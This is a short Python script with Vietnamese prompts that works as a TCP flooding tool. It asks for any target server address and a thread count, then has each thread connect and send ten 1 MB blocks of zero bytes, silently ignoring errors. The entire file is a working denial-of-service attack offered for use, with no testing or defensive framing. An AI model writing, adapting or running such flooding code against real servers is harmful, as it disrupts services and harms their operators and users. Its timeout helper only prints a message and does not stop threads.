import socket
import threading
import time

def send_packet(server_ip, server_port, packet, packet_count, thread_id):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))
            for i in range(packet_count):
                s.sendall(packet)
            print(f"Luồng {thread_id} đã gửi {packet_count} đến server thành công")
    except Exception as e:
        pass 

def stop_thread_after_timeout(thread, timeout=5):
    time.sleep(timeout)
    if thread.is_alive():
        print(f"Luồng {thread.name} hoàn thành")

server_address = input("Nhập địa chỉ server : ")
server_ip, server_port = server_address.split(":")
server_port = int(server_port) 

packet = b"\x00" * (1024 * 1024) 

packet_count = 10

thread_count = int(input("Nhập số lượng luồng: "))

threads = []
for i in range(thread_count):
    thread = threading.Thread(target=send_packet, args=(server_ip, server_port, packet, packet_count, i+1))
    threads.append(thread)
    thread.start()

    timer = threading.Thread(target=stop_thread_after_timeout, args=(thread,))
    timer.start()
    
for thread in threads:
    thread.join()

print("Hoàn tất gửi gói tin.")